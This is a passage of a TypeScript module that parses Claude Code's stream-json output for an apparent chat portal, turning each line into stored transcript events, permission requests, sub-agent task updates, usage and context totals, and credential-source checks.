// Chat sessions: the pure stream-json protocol (chat-sessions PRD §10.3). No I/O, fully unit-testable.
// `parseLine` turns one line of `claude -p --output-format stream-json` into what the controller must
// do; the builders turn an action into one JSON line to write into the session's stdin FIFO.

import { REQUEST_FULL_MAX, type ChatEvent, type ChatInputState, type ChatModelOption, type ChatRequest, type ChatSessionState, type ChatTask } from '@portal/contracts';
import { redact } from './redact.js';

/** A base64 image as Claude Code carries it; the controller turns it into a blob and never stores this. */
export interface RawImage {
  mediaType: string;
  dataBase64: string;
}

/** A transcript event ready to store: a {@link ChatEvent} without the fields the store assigns (seq,
 *  at), plus the raw identifiers the controller persists in the event's own columns. */
/** One model's running totals for the process, from a result's `modelUsage` (sub-agents included). */
export interface ModelTotals {
  model: string;
  input: number;
  output: number;
  cacheRead: number;
  cacheWrite: number;
  costUsd: number;
}

export type StoredEvent = Omit<ChatEvent, 'seq' | 'at'> & {
  /** For `result`: each model's running totals, so the controller can tell what this turn used. */
  modelTotals?: ModelTotals[];
  uuid?: string;
  parentToolUseId?: string | null;
  requestId?: string;
  /** The tool call a `tool_use` or `tool_result` belongs to, so the controller can name the result. */
  toolUseId?: string;
  /** Images a tool returned, still base64: the controller saves them as blobs, sets `images`, and drops these. */
  rawImages?: RawImage[];
};

/** A change to one sub-agent or background task, from a `system/task_*` line (never its prompt). */
export interface TaskPatch {
  taskId: string;
  /** The `Task` tool_use that started it; its sub-agent's lines carry this as `parent_tool_use_id`. */
  toolUseId?: string;
  description?: string;
  subagentType?: string;
  taskType?: string;
  background?: boolean;
  status?: ChatTask['status'];
  /** `task_started`: it starts now. */
  started?: boolean;
  /** When it ended (epoch ms), from `task_updated`. */
  endedAtMs?: number;
  summary?: string;
  tokens?: number;
  toolUses?: number;
  durationMs?: number;
}

/** A reply to a control_request the portal sent, matched by `request_id`. Never stored or logged: some
 *  replies (`get_settings`) echo environment values, API keys included. */
export type ControlResponse = { requestId: string; ok: true; response: Record<string, unknown> } | { requestId: string; ok: false; error: string };

/** What one stdout line means: events to store, an ephemeral delta, session patches, a request, etc. */
export interface ParsedLine {
  /** Events to append to the transcript, in order. */
  stored: StoredEvent[];
  /** A live token for the open block; shown but never stored (not replayed on resume). */
  delta?: { agentLabel: string | null; text: string };
  /** A thinking block started (its text isn't streamed; the finished block is stored as `thinking`). */
  thinkingStarted?: { agentLabel: string | null };
  /** Fields to update on the session row. `cost` is absolute; `turnsDelta` is added. */
  sessionPatch?: { model?: string; mode?: string; state?: ChatSessionState; cost?: number; turnsDelta?: number };
  /** A permission/question request the agent raised (carries the tool_use_id for the controller). */
  request?: ChatRequest & { toolUseId?: string };
  /** The raw input of that request's tool, for the controller to decide on at once. Never stored, shown or logged. */
  toolInput?: unknown;
  /** The `session_id` the agent reported; the controller ends the session if it isn't the expected one. */
  sessionIdSeen?: string;
  /** A control_request the controller doesn't handle: its request_id, to answer with an error response. */
  controlError?: string;
  /** Claude Code withdrew a request it had asked (an interrupt, a rule or another client answered it): its id. */
  cancelRequest?: string;
  /** Set for `system/init`: after a process's first one the controller reads the applied settings. */
  init?: boolean;
  /** From a main-thread `system/init`: the portal's own MCP servers (`plugin:cpm-<set>:<key>`) and the status Claude Code gave each (✅ `connected`, `needs-auth`, `failed`). */
  mcpServers?: { name: string; status: string }[];
  /** A reply to one of the portal's own control requests. */
  controlResponse?: ControlResponse;
  /** Lines the portal sent moving through Claude Code's queue, by their client uuid. */
  inputs?: { uuid: string; state: ChatInputState }[];
  /** Sub-agent and background task changes. */
  tasks?: TaskPatch[];
  /** `Task`/`Agent` tool calls and their descriptions, to label sub-agent lines. */
  agents?: { toolUseId: string; description: string }[];
  /**
   * The model a sub-agent runs on, by the Task call that started it: `observed` from its own line's `message.model` (what answered), else
   * `launched` from the call's result (`tool_use_result.resolvedModel`). Never the call's `model` argument: that is only what was asked for.
   */
  agentModels?: { toolUseId: string; model: string; source: 'observed' | 'launched' }[];
  /**
   * From a `result`: the tokens its `usage` counts (input, cache reads and writes, output) and each
   * model's context window from `modelUsage`; the controller picks the window of the model in use.
   */
  context?: { usedTokens: number; windows: { model: string; tokens: number }[] };
  /**
   * One main-thread API call's usage: input and cache tokens from its `assistant` line (keyed by the
   * message id), or its final output count from the stream's `message_delta`. The context after a
   * turn is the last call's, not the turn's sum, which adds up every call.
   */
  mainUsage?: { messageId: string | null; input?: number; output?: number };

  /* What the integrity checks (PRD §10.4) look at. */

  /** The permission mode a main-thread `system/init` or `system/status` reports. */
  modeSeen?: string;
  /**
   * A replayed user line (`isReplay`): the uuid Claude Code read it under, and whether it's local command
   * output (`<local-command-stdout>`), which Claude Code echoes under an id of its own.
   */
  replay?: { uuid: string | null; localCommand: boolean; modelNote?: boolean; origin?: { kind: string; producer: string | null } };
  /** A `command_lifecycle` line's command uuid, whatever its state. */
  commandUuid?: string;
  /** The main thread called EnterPlanMode, which needs no approval: `plan` mode may follow. */
  enterPlan?: boolean;

  /* What the credential checks (PRD §6 rules 1 and 3) look at. Never stored or shown. */

  /**
   * From a main-thread `system/init` (one per turn): the credential source Claude Code reports, or null
   * when the line carries none. The controller only compares it with {@link POOL_KEY_SOURCE}.
   */
  apiKeySource?: string | null;
  /** A `rate_limit_event` line: Claude Code saw plan rate limits on this credential. */
  rateLimitEvent?: boolean;
  /**
   * The `rate_limit_info` object of that line (or of an assistant line that failed with `usage_limit_reached`), exactly as
   * Claude Code emitted it, for Claude usage's hook. Never stored, redacted, logged or sent to a tab.
   */
  rateLimitInfo?: unknown;
  /** A `result` line: the turn ended (the controller then runs the subscription check). */
  result?: boolean;

  /** A text block started or ended (or its message did): held-back delta text is flushed. */
  blockEdge?: { agentLabel: string | null };
}

const asObj = (v: unknown): Record<string, unknown> | null => (v && typeof v === 'object' && !Array.isArray(v) ? (v as Record<string, unknown>) : null);
const asStr = (v: unknown): string | null => (typeof v === 'string' ? v : null);
const asNum = (v: unknown): number | null => (typeof v === 'number' && Number.isFinite(v) ? v : null);
const asStrings = (v: unknown): string[] => (Array.isArray(v) ? v.filter((x): x is string => typeof x === 'string') : []);
const clip = (s: string, max: number): string => (s.length > max ? `${s.slice(0, max - 1)}…` : s);
/** Redacted first, then clipped, so a cut never leaves part of a credential behind. */
const clean = (s: string, max: number): string => clip(redact(s), max);

/** How much of a sub-agent's description and final summary is kept. */
const MAX_LABEL = 200;
const MAX_SUMMARY = 4_000;

/** What a turn that Claude Code stopped itself because of a limit says, instead of its raw reason. */
const STOPPED_BY: Record<string, string> = {
  error_max_budget_usd: 'Budget reached: this session hit its spending limit, so Claude stopped. Raise the limit in Settings to go on.',
  error_max_turns: 'Stopped at the turn limit. Send a message to go on.',
};

/** Parses one stdout line. Lines to ignore (and anything malformed) come back as `{ stored: [] }`. */
export function parseLine(raw: string): ParsedLine {
  let obj: Record<string, unknown> | null;
  try {
    obj = asObj(JSON.parse(raw));
  } catch {
    return { stored: [] };
  }
  if (!obj) return { stored: [] };
  switch (asStr(obj.type)) {
    case 'system':
      return parseSystem(obj);
    case 'stream_event':
      return parseStreamEvent(obj);
    case 'assistant':
      return parseAssistant(obj);
    case 'user':
      return parseUser(obj);
    case 'result':
      return parseResult(obj);
    case 'control_request':
      return parseControlRequest(obj);
    case 'control_response':
      return parseControlResponse(obj);
    case 'command_lifecycle':
      return parseLifecycle(obj);
    case 'control_cancel_request': {
      const requestId = asStr(obj.request_id);
      return requestId ? { stored: [], cancelRequest: requestId } : { stored: [] };
    }
    case 'api_retry':
      return { stored: [{ kind: 'retry', text: 'The API is retrying (rate limit or overload).' }] };
    case 'rate_limit_event':
      // `{type, rate_limit_info, uuid, session_id}`, "emitted when rate limit info changes" (the 2.1.296
      // schema): plan limits, which an API key never has. Nothing of it is kept.
      return { stored: [], rateLimitEvent: true, rateLimitInfo: obj.rate_limit_info };
    default:
      return { stored: [] };
  }
}

/** `system/init` sets model and mode and reports the session id; `status` lines carry the working state
 *  and mode; `task_*` and `background_tasks_changed` track sub-agents. Only main-thread lines speak for
 *  the session's model and mode. */
function parseSystem(obj: Record<string, unknown>): ParsedLine {
  const main = !asStr(obj.parent_tool_use_id);
  switch (asStr(obj.subtype)) {
    case 'init': {
      const out: ParsedLine = { stored: [{ kind: 'system', text: 'Ready' }], init: true };
      const patch: NonNullable<ParsedLine['sessionPatch']> = {};
      const model = asStr(obj.model);
      if (model && main) patch.model = model;
      const mode = asStr(obj.permissionMode);
      if (mode && main) {
        patch.mode = mode;
        out.modeSeen = mode;
      }
      if (Object.keys(patch).length) out.sessionPatch = patch;
      const sid = asStr(obj.session_id);
      if (sid) out.sessionIdSeen = sid;
      // Every turn's credential source; a main-thread init without one reads null (and fails the check).
      if (main) out.apiKeySource = asStr(obj.apiKeySource);
      // OAuth servers that need a sign-in say so here (MCP set PRD §13.3); only the portal's own servers, names and words checked.
      if (main && Array.isArray(obj.mcp_servers)) {
        const servers: { name: string; status: string }[] = [];
        for (const raw of obj.mcp_servers.slice(0, 200)) {
          const o = asObj(raw);
          const name = asStr(o?.name);
          const status = asStr(o?.status);
          if (name && status && /^plugin:cpm-[a-z0-9-]{1,12}:[a-z0-9-]{1,16}$/.test(name) && /^[a-z-]{1,24}$/.test(status)) servers.push({ name, status });
        }
        if (servers.length) out.mcpServers = servers;
      }
      return out;
    }
    case 'status':
      return parseStatus(obj, main);
    case 'permission_denied': {
      // Auto mode's classifier blocked a tool call (chat PRD, Auto): nobody was asked, so the transcript says which tool and why, in one line.
      // The reason is the classifier's rule name; the tool's input is never repeated here.
      const tool = asStr(obj.tool_name);
      const reason = asStr(obj.decision_reason);
      const how = asStr(obj.decision_reason_type);
      // eslint-disable-next-line no-control-regex
      const one = (v: string, max: number) => clean(v.replace(/[\x00-\x1f\x7f]+/g, ' ').trim(), max);
      const text = `${how === 'classifier' ? 'Auto blocked' : 'Blocked'} ${tool ? one(tool, 80) : 'a tool'}${reason ? `: ${one(reason, 160)}` : ''}`;
      const parent = asStr(obj.parent_tool_use_id);
      return { stored: [{ kind: 'system', text, ...(parent ? { parentToolUseId: parent } : {}) }] };
    }
    case 'task_started':
    case 'task_updated':
    case 'task_notification': {
      const task = parseTask(obj);
      return task ? { stored: [], tasks: [task] } : { stored: [] };
    }
    case 'background_tasks_changed': {
      const tasks: TaskPatch[] = [];
      for (const raw of Array.isArray(obj.tasks) ? obj.tasks : []) {
        const t = asObj(raw);
        const taskId = asStr(t?.task_id);
        if (!t || !taskId) continue;
        tasks.push(taskFields(t, { taskId, background: true }));
      }
      return tasks.length ? { stored: [], tasks } : { stored: [] };
    }
    default:
      return { stored: [] };
  }
}

/** `requesting` means working, and names the sent lines that request reads; any status line may carry
 *  the permission mode now in effect (e.g. after `set_permission_mode`). */
function parseStatus(obj: Record<string, unknown>, main: boolean): ParsedLine {
  const out: ParsedLine = { stored: [] };
  const patch: NonNullable<ParsedLine['sessionPatch']> = {};
  if (asStr(obj.status) === 'requesting') {
    patch.state = 'working';
    const read = asStrings(obj.user_message_uuids);
    if (read.length) out.inputs = read.map((uuid) => ({ uuid, state: 'started' }));
  }
  const mode = asStr(obj.permissionMode);
  if (mode && main) {
    patch.mode = mode;
    out.modeSeen = mode;
  }
  if (Object.keys(patch).length) out.sessionPatch = patch;
  return out;
}

/** One `task_started` / `task_updated` / `task_notification` line as a patch. The prompt is never kept. */
function parseTask(obj: Record<string, unknown>): TaskPatch | null {
  const taskId = asStr(obj.task_id);
  if (!taskId) return null;
  const subtype = asStr(obj.subtype);
  if (subtype === 'task_started') {
    const t = taskFields(obj, { taskId, started: true, status: 'running' });
    if (typeof obj.is_backgrounded === 'boolean') t.background = obj.is_backgrounded;
    return t;
  }
  if (subtype === 'task_updated') {
    const patch = asObj(obj.patch) ?? {};
    const t: TaskPatch = { taskId };
    const status = taskStatus(patch.status);
    if (status) t.status = status;
    const end = asNum(patch.end_time);
    if (end !== null) t.endedAtMs = end;
    const description = asStr(patch.description);
    if (description) t.description = clean(description, MAX_LABEL);
    if (typeof patch.is_backgrounded === 'boolean') t.background = patch.is_backgrounded;
    return t;
  }
  // task_notification: how it finished.
  const t = taskFields(obj, { taskId });
  const status = taskStatus(obj.status);
  if (status) t.status = status;
  const summary = asStr(obj.summary);
  if (summary) t.summary = clean(summary, MAX_SUMMARY);
  const usage = asObj(obj.usage);
  const tokens = asNum(usage?.total_tokens);
  if (tokens !== null) t.tokens = tokens;
  const toolUses = asNum(usage?.tool_uses);
  if (toolUses !== null) t.toolUses = toolUses;
  const durationMs = asNum(usage?.duration_ms);
  if (durationMs !== null) t.durationMs = durationMs;
  return t;
}

/** The identifying fields a task line may carry: tool_use_id, description, subagent and task type. */
function taskFields(obj: Record<string, unknown>, base: TaskPatch): TaskPatch {
  const t: TaskPatch = { ...base };
  const toolUseId = asStr(obj.tool_use_id);
  if (toolUseId) t.toolUseId = toolUseId;
  const description = asStr(obj.description);
  if (description) t.description = clean(description, MAX_LABEL);
  const subagentType = asStr(obj.subagent_type);
  if (subagentType) t.subagentType = subagentType;
  const taskType = asStr(obj.task_type);
  if (taskType) t.taskType = taskType;
  return t;
}

/** Claude Code's task status, folded into the four the UI shows; unknown values change nothing. */
function taskStatus(v: unknown): ChatTask['status'] | null {
  switch (asStr(v)) {
    case 'running':
    case 'pending':
      return 'running';
    case 'completed':
      return 'completed';
    case 'failed':
    case 'error':
      return 'failed';
    case 'killed':
    case 'stopped':
    case 'cancelled':
      return 'killed';
    default:
      return null;
  }
}

/** Live text deltas: shown as an ephemeral delta, never stored. A block's start and stop (and its
 *  message's stop) mark where held-back text is flushed; other stream_event subtypes are ignored. */
function parseStreamEvent(obj: Record<string, unknown>): ParsedLine {
  const event = asObj(obj.event);
  const agentLabel = asStr(obj.parent_tool_use_id);
  switch (asStr(event?.type)) {
    case 'content_block_delta': {
      const delta = asObj(event?.delta);
      if (delta && asStr(delta.type) === 'text_delta') return { stored: [], delta: { agentLabel, text: asStr(delta.text) ?? '' } };
      return { stored: [] };
    }
    case 'content_block_start':
      if (asStr(asObj(event?.content_block)?.type) === 'thinking') return { stored: [], blockEdge: { agentLabel }, thinkingStarted: { agentLabel } };
      return { stored: [], blockEdge: { agentLabel } };
    case 'content_block_stop':
    case 'message_stop':
      return { stored: [], blockEdge: { agentLabel } };
    case 'message_delta': {
      const output = asNum(asObj(event?.usage)?.output_tokens);
      if (agentLabel || output === null) return { stored: [] };
      return { stored: [], mainUsage: { messageId: asStr(obj.api_message_id), output: tokens(output) } };
    }
    default:
      return { stored: [] };
  }
}

/** A model id as Claude Code reports it (`claude-sonnet-4-5`, `claude-opus-4-6[1m]`, a Bedrock or Vertex id); `<synthetic>` and anything else is not one. */
const MODEL_ID = /^[A-Za-z0-9][A-Za-z0-9._:@/[\]-]{0,119}$/;
const modelId = (v: unknown): string | null => {
  const s = asStr(v);
  return s && MODEL_ID.test(s) ? s : null;
};

/** Tools that start a sub-agent; their `description` input names it. */
const AGENT_TOOLS = new Set(['Task', 'Agent']);

/** One `assistant` line carries completed content blocks: text and tool_use are each stored. */
function parseAssistant(obj: Record<string, unknown>): ParsedLine {
  const content = asObj(obj.message)?.content;
  const agentLabel = asStr(obj.parent_tool_use_id);
  const uuid = asStr(obj.uuid) ?? undefined;
  const stored: StoredEvent[] = [];
  const agents: NonNullable<ParsedLine['agents']> = [];
  let enterPlan = false;
  if (Array.isArray(content))
    for (const raw of content) {
      const block = asObj(raw);
      if (!block) continue;
      if (asStr(block.type) === 'text') stored.push({ kind: 'assistant', text: asStr(block.text) ?? '', agentLabel, uuid, parentToolUseId: agentLabel });
      // Thinking shows as a collapsed row; redacted thinking has nothing readable, only that it happened.
      else if (asStr(block.type) === 'thinking' || asStr(block.type) === 'redacted_thinking')
        stored.push({ kind: 'thinking', text: asStr(block.thinking) ?? '', agentLabel, uuid, parentToolUseId: agentLabel });
      else if (asStr(block.type) === 'tool_use') {
        const name = asStr(block.name);
        const id = asStr(block.id);
        const ev: StoredEvent = { kind: 'tool_use', toolName: name ?? undefined, agentLabel, uuid, parentToolUseId: agentLabel };
        if (id) ev.toolUseId = id;
        // The transcript's one-line summary of the call (a command, a path, a sub-agent's task); the
        // input itself is never stored.
        const summary = requestDetail(name, block.input);
        if (summary) ev.text = summary;
        stored.push(ev);
        const description = asStr(asObj(block.input)?.description);
        if (name && AGENT_TOOLS.has(name) && id && description) agents.push({ toolUseId: id, description: clean(description, MAX_LABEL) });
        if (name === 'EnterPlanMode' && !agentLabel) enterPlan = true;
      }
    }
  const out: ParsedLine = { stored };
  if (agents.length) out.agents = agents;
  if (enterPlan) out.enterPlan = true;
  // A sub-agent's line says which model answered it.
  const model = agentLabel ? modelId(asObj(obj.message)?.model) : null;
  if (agentLabel && model) out.agentModels = [{ toolUseId: agentLabel, model, source: 'observed' }];
  // A turn that failed on the plan's usage limit carries its limit info on the assistant line itself.
  if (asStr(obj.api_error) === 'usage_limit_reached') {
    const info = asObj(obj.api_error_params)?.rate_limit_info;
    if (info !== undefined) out.rateLimitInfo = info;
  }
  const usage = asObj(asObj(obj.message)?.usage);
  if (usage && !agentLabel) {
    const input = tokens(usage.input_tokens) + tokens(usage.cache_read_input_tokens) + tokens(usage.cache_creation_input_tokens);
    if (input > 0) out.mainUsage = { messageId: asStr(asObj(obj.message)?.id), input, output: tokens(usage.output_tokens) };
  }
  return out;
}

/** Local command output (`/compact`'s "Compacted", …) as Claude Code wraps it. */
const LOCAL_OUTPUT = /^\s*<local-command-(?:stdout|stderr)>/;
/** What Claude Code echoes after a `set_model` control request: its note of the model now in use. */
const MODEL_NOTE = /^\s*<local-command-stdout>Set model to [^<]*<\/local-command-stdout>\s*$/;

function isLocalOutput(content: unknown): boolean {
  if (typeof content === 'string') return LOCAL_OUTPUT.test(content);
  const first = Array.isArray(content) ? asObj(content[0]) : null;
  return asStr(first?.type) === 'text' && LOCAL_OUTPUT.test(asStr(first?.text) ?? '');
}

/**
 * Where Claude Code says a replayed user line came from (`origin`, set by Claude Code itself and not by anything in the message): for example
 * `{ kind: 'task-notification', producer: 'session-task' }` when a background command it started has finished. Short plain tokens only,
 * since the kind is shown in an integrity failure's text.
 */
function replayOrigin(raw: unknown): { kind: string; producer: string | null } | undefined {
  const o = asObj(raw);
  const kind = asStr(o?.kind);
  if (!kind || !/^[a-z][a-z0-9_-]{0,39}$/.test(kind)) return undefined;
  const producer = asStr(o?.producer);
  return { kind, producer: producer && /^[a-z][a-z0-9_-]{0,39}$/.test(producer) ? producer : null };
}

/** Incoming `user` lines: an array holds tool results (stored, images pulled out for the blob store); a
 *  string, or anything marked `isReplay`, is a line we sent and already stored. A replay reports the
 *  uuid it carries, which the controller checks against what it sent. */
function parseUser(obj: Record<string, unknown>): ParsedLine {
  const content = asObj(obj.message)?.content;
  if (obj.isReplay === true) {
    const text = typeof content === 'string' ? content : (asStr(asObj(Array.isArray(content) ? content[0] : null)?.text) ?? '');
    const origin = replayOrigin(obj.origin);
    return { stored: [], replay: { uuid: asStr(obj.uuid), localCommand: isLocalOutput(content), modelNote: MODEL_NOTE.test(text), ...(origin ? { origin } : {}) } };
  }
  if (typeof content === 'string') return { stored: [] }; // a replay: the user event was stored when we sent it
  const agentLabel = asStr(obj.parent_tool_use_id);
  const stored: StoredEvent[] = [];
  if (!Array.isArray(content)) return { stored };
  let last: StoredEvent | undefined;
  const beside: RawImage[] = [];
  for (const raw of content) {
    const block = asObj(raw);
    if (!block) continue;
    const type = asStr(block.type);
    if (type === 'tool_result') {
      const { text, images } = toolResultContent(block.content);
      last = { kind: 'tool_result', text, agentLabel, parentToolUseId: agentLabel };
      if (block.is_error === true) last.isError = true;
      const toolUseId = asStr(block.tool_use_id);
      if (toolUseId) last.toolUseId = toolUseId; // the controller names the result from its call
      if (images.length) last.rawImages = images;
      stored.push(last);
    } else if (type === 'image') {
      const image = rawImage(block);
      if (image) beside.push(image);
    }
  }
  // Image blocks next to a tool result are what that tool returned; without one, the line isn't a tool's.
  if (last && beside.length) last.rawImages = [...(last.rawImages ?? []), ...beside];
  // The result of a call that launched a sub-agent names the model Claude Code started it on.
  const launched = modelId(asObj(obj.tool_use_result)?.resolvedModel);
  if (launched && stored.length === 1 && last?.toolUseId) return { stored, agentModels: [{ toolUseId: last.toolUseId, model: launched, source: 'launched' }] };
  return { stored };
}

/** A tool_result's content as short text plus its images (base64, for the blob store — never the text). */
function toolResultContent(v: unknown): { text: string; images: RawImage[] } {
  const blocks = Array.isArray(v) ? v : asObj(v) ? [v] : null;
  if (!blocks) return { text: shortText(v), images: [] };
  const parts: string[] = [];
  const images: RawImage[] = [];
  for (const raw of blocks) {
    const block = asObj(raw);
    const type = asStr(block?.type);
    if (block && type === 'image') {
      const image = rawImage(block);
      if (image) images.push(image);
    } else if (block && type === 'text') parts.push(asStr(block.text) ?? '');
    else if (typeof raw === 'string') parts.push(raw);
    else parts.push(`[${type ?? 'content'}]`); // other blocks (documents, …) may carry base64 too: name them only
  }
  return { text: clean(parts.join('\n'), 500), images };
}

/** `{type: "image", source: {type: "base64", media_type, data}}` → a raw image, else null. */
function rawImage(block: Record<string, unknown>): RawImage | null {
  const source = asObj(block.source);
  if (!source || asStr(source.type) !== 'base64') return null;
  const mediaType = asStr(source.media_type);
  const dataBase64 = asStr(source.data);
  return mediaType && dataBase64 ? { mediaType, dataBase64 } : null;
}

/** A `result` ends the turn: store it (with cost), update totals, go idle, and flag an errored turn. */
function parseResult(obj: Record<string, unknown>): ParsedLine {
  const subtype = asStr(obj.subtype);
  const cost = asNum(obj.total_cost_usd);
  const text = asStr(obj.result) ?? undefined;
  const errored = obj.is_error === true || (subtype !== null && subtype !== 'success');
  const ended: StoredEvent = { kind: 'result', text, costUsd: cost ?? undefined };
  // The turn's own numbers (`usage` is per turn; `total_cost_usd` is the process's running total).
  const took = asNum(obj.duration_ms);
  if (took !== null && took >= 0) ended.durationMs = Math.round(took);
  const usage = asObj(obj.usage);
  if (usage) {
    ended.tokens = {
      input: tokens(usage.input_tokens),
      output: tokens(usage.output_tokens),
      cacheRead: tokens(usage.cache_read_input_tokens),
      cacheWrite: tokens(usage.cache_creation_input_tokens),
    };
  }
  const models: ModelTotals[] = [];
  for (const [model, entry] of Object.entries(asObj(obj.modelUsage) ?? {})) {
    const e = asObj(entry);
    if (!e) continue;
    const cost = asNum(e.costUSD);
    models.push({
      model,
      input: tokens(e.inputTokens),
      output: tokens(e.outputTokens),
      cacheRead: tokens(e.cacheReadInputTokens),
      cacheWrite: tokens(e.cacheCreationInputTokens),
      costUsd: cost !== null && cost > 0 ? cost : 0,
    });
  }
  if (models.length) ended.modelTotals = models;
  const stored: StoredEvent[] = [ended];
  if (errored) stored.push({ kind: 'error', text: text ?? STOPPED_BY[subtype ?? ''] ?? `The turn ended with ${subtype ?? 'an error'}.` });
  const patch: NonNullable<ParsedLine['sessionPatch']> = { state: 'idle', turnsDelta: 1 };
  if (cost !== null) patch.cost = cost;
  const out: ParsedLine = { stored, sessionPatch: patch, result: true };
  const context = resultContext(obj);
  if (context) out.context = context;
  const sid = asStr(obj.session_id);
  if (sid) out.sessionIdSeen = sid;
  return out;
}

/** A token count from a usage report: a whole, non-negative number, else 0. */
const tokens = (v: unknown): number => {
  const n = asNum(v);
  return n !== null && n > 0 ? Math.round(n) : 0;
};

/**
 * How full the context is, from a `result`'s own usage report (no request of its own):
 * `input_tokens + cache_read_input_tokens + cache_creation_input_tokens + output_tokens`, a missing
 * count reading 0, and each `modelUsage` entry's `contextWindow`. A result that read nothing (no
 * `usage`, or all zeros: a local command, a turn stopped before its first request) says nothing new.
 */
function resultContext(obj: Record<string, unknown>): ParsedLine['context'] | null {
  const usage = asObj(obj.usage);
  if (!usage) return null;
  const usedTokens = tokens(usage.input_tokens) + tokens(usage.cache_read_input_tokens) + tokens(usage.cache_creation_input_tokens) + tokens(usage.output_tokens);
  if (usedTokens === 0) return null;
  const windows: { model: string; tokens: number }[] = [];
  for (const [model, entry] of Object.entries(asObj(obj.modelUsage) ?? {})) {
    const size = tokens(asObj(entry)?.contextWindow);
    if (size > 0) windows.push({ model, tokens: size });
  }
  return { usedTokens, windows };
}

/** `can_use_tool` becomes a request the operator must answer; any other control_request gets an error. */
function parseControlRequest(obj: Record<string, unknown>): ParsedLine {
  const requestId = asStr(obj.request_id);
  const request = asObj(obj.request);
  if (requestId && request && asStr(request.subtype) === 'can_use_tool') {
    const toolName = asStr(request.tool_name);
    const req: ChatRequest & { toolUseId?: string } = {
      requestId,
      kind: 'tool',
      toolName,
      agentLabel: asStr(obj.parent_tool_use_id),
      title: requestTitle(toolName),
      detail: requestDetail(toolName, request.input),
      createdAt: '', // the store assigns the real timestamp on insert
    };
    // What is being allowed, whole: the one-line `detail` above is only its summary.
    const full = requestFull(toolName, request.input);
    if (full) {
      req.full = full.text;
      req.fullCut = full.cut;
    }
    const toolUseId = asStr(request.tool_use_id);
    if (toolUseId) req.toolUseId = toolUseId;
    return { stored: [], request: req, toolInput: request.input, sessionPatch: { state: 'waiting' } };
  }
  if (requestId) return { stored: [], controlError: requestId };
  return { stored: [] };
}

/** Claude Code's answer to a control request the portal sent: success (with an optional body) or error. */
function parseControlResponse(obj: Record<string, unknown>): ParsedLine {
  const response = asObj(obj.response);
  const requestId = asStr(response?.request_id);
  if (!response || !requestId) return { stored: [] };
  if (asStr(response.subtype) === 'success') return { stored: [], controlResponse: { requestId, ok: true, response: asObj(response.response) ?? {} } };
  return { stored: [], controlResponse: { requestId, ok: false, error: asStr(response.error) ?? 'Claude Code refused the request.' } };
}

/** The `command_lifecycle` states a sent line can report. */
const LIFECYCLE = new Set<string>(['queued', 'started', 'completed', 'cancelled', 'discarded']);

/** `command_lifecycle`: a line the portal sent was queued, started, completed or cancelled. Its uuid is
 *  reported for the integrity check whatever the state. */
function parseLifecycle(obj: Record<string, unknown>): ParsedLine {
  const uuid = asStr(obj.command_uuid);
  if (!uuid) return { stored: [] };
  const state = asStr(obj.state);
  if (!state || !LIFECYCLE.has(state)) return { stored: [], commandUuid: uuid };
  return { stored: [], commandUuid: uuid, inputs: [{ uuid, state: state as ChatInputState }] };
}

/* ---------- Control replies, reduced to what may be kept ---------- */

/** The applied settings the session shows (from `get_settings.applied`). */
export interface AppliedSettings {
  model?: string;
  effort?: string | null;
  ultracode?: boolean;
  ultracodeAvailable?: boolean;
}

/** Only `applied` from a `get_settings` reply — never `effective` or `sources`, which echo env values
 *  (API keys included) in plain text. Null when the reply has no `applied`. */
export function pickApplied(response: Record<string, unknown>): AppliedSettings | null {
  const applied = asObj(response.applied);
  if (!applied) return null;
  const out: AppliedSettings = {};
  const model = asStr(applied.model);
  if (model) out.model = model;
  if (applied.effort === null) out.effort = null;
  else {
    const effort = asStr(applied.effort);
    if (effort) out.effort = effort;
  }
  if (typeof applied.ultracode === 'boolean') out.ultracode = applied.ultracode;
  if (typeof applied.ultracodeAvailable === 'boolean') out.ultracodeAvailable = applied.ultracodeAvailable;
  return out;
}

/* ---------- Credential checks (PRD §6 rules 1 and 3): verdicts only, nothing kept ---------- */

/**
 * The only credential source a session may report in `system/init`: Account Pool's managed
 * `apiKeyHelper`. Observed with Claude Code 2.1.296 in the workspace image (managed drop-in naming
 * `/etc/claudepilot/bin/account-key <id>`, custom host): `apiKeyHelper` on every turn. For contrast, an
 * `ANTHROPIC_API_KEY` in the environment reports `ANTHROPIC_API_KEY` and no credential reports `none`.
 * The CLI's schema lists the rest: `/login managed key` (a Console key stored by /login), and `none` also
 * for a claude.ai login, a bearer token or a cloud provider. Anything but the helper ends the session.
 */
export const POOL_KEY_SOURCE = 'apiKeyHelper';

/** Why a credential check ends a session; fixed text that never names the credential, account or plan. */
export const CREDENTIAL = {
  keySource: "Claude Code stopped using the pool's key",
  planLimits: 'plan limits appeared on this credential',
  unconfirmed: "Claude Code's usage report didn't confirm an API key",
  refused: 'Claude Code refused the subscription check',
  unanswered: "Claude Code didn't answer the subscription check",
} as const;

/**
 * Rule 3's subscription check on a `get_usage {skip_behaviors: true}` reply: null when it shows an
 * API-key session, else why it doesn't. Observed with 2.1.296 for helper, environment-key and no-key
 * sessions alike: `{session: {…totals}, subscription_type: null, rate_limits_available: false,
 * rate_limits: null, behaviors: null}`; the CLI's schema documents `subscription_type` as null "for API
 * key / 3P provider sessions" and `rate_limits_available` as false "when plan rate limits do not apply".
 * So plan limits, a subscription type, or a reply without `rate_limits_available: false` fail (closed).
 */
export function usageVerdict(response: Record<string, unknown>): string | null {
  if (response.rate_limits !== null && response.rate_limits !== undefined) return CREDENTIAL.planLimits;
  if (response.subscription_type !== null && response.subscription_type !== undefined) return CREDENTIAL.planLimits;
  if (response.rate_limits_available === true) return CREDENTIAL.planLimits;
  if (response.rate_limits_available !== false) return CREDENTIAL.unconfirmed;
  return null;
}

/** The models a `list_models` reply offers, as picker rows. */
export function pickModels(response: Record<string, unknown>): ChatModelOption[] {
  const out: ChatModelOption[] = [];
  for (const raw of Array.isArray(response.models) ? response.models : []) {
    const m = asObj(raw);
    const value = asStr(m?.value);
    if (!m || !value) continue;
    out.push({ value, displayName: asStr(m.displayName) ?? value, description: asStr(m.description), resolvedModel: asStr(m.resolvedModel), effortLevels: asStrings(m.supportedEffortLevels) });
  }
  return out;
}

/* ---------- Outgoing lines (each ends in the newline the FIFO protocol needs) ---------- */

const line = (value: unknown): string => `${JSON.stringify(value)}\n`;

/**
 * A user message. `uuid` (the client's) lets `command_lifecycle` report on it; `priority` `next` steers
 * the running turn and `later` waits for it to end. With images the content is an array: the text (when
 * there is any) and then one base64 image block each; with `imagesFirst` the images come first and the text
 * last. Claude Code (2.1.296) reads `@path` mentions only from the LAST block of an array, so a message
 * that carries files for it to open puts its words last.
 */
